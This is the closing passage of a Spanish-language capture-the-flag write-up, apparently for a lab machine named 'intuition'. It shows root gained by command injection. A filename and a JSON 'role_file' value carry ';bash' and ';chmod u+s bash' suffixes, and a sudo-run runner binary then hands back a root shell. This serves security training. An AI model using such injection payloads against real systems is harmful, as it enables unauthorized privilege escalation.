+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/tmp$ mv <span style="color:#0ff;font-weight:bold">&#34;test.tar.gz;chmod u+s bash&#34;</span> <span style="color:#0ff;font-weight:bold">&#34;test.tar.gz;bash&#34;</span></span></span></code></pre></div>
+<p>Cambiamos el archivo .json</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>  <span style="font-weight:bold">&#34;run&#34;</span>: {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    <span style="font-weight:bold">&#34;action&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;install&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    <span style="font-weight:bold">&#34;role_file&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;/tmp/test.tar.gz;bash&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>  <span style="font-weight:bold">&#34;auth_code&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;UHI75GHINKOP&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>}</span></span></code></pre></div>
+<p>Y ejecutamos el binario..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting galaxy role install process
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>[WARNING]: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>attempting to call Galaxy at <span style="color:#0ff;font-weight:bold">&#39;https://galaxy.ansible.com/api/&#39;</span>: &lt;urlopen error [Errno -3]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Temporary failure in name resolution&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>root@intuition:/tmp# cat test.json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  <span style="color:#0ff;font-weight:bold">&#34;run&#34;</span>: {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    <span style="color:#0ff;font-weight:bold">&#34;action&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;install&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    <span style="color:#0ff;font-weight:bold">&#34;role_file&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;/tmp/test.tar.gz;bash&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>  <span style="color:#0ff;font-weight:bold">&#34;auth_code&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;UHI75GHINKOP&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>root@intuition:/tmp# id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>uid=0(root) gid=0(root) groups=0(root)</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+]]></content:encoded>
     </item>
   </channel>
 </rss>
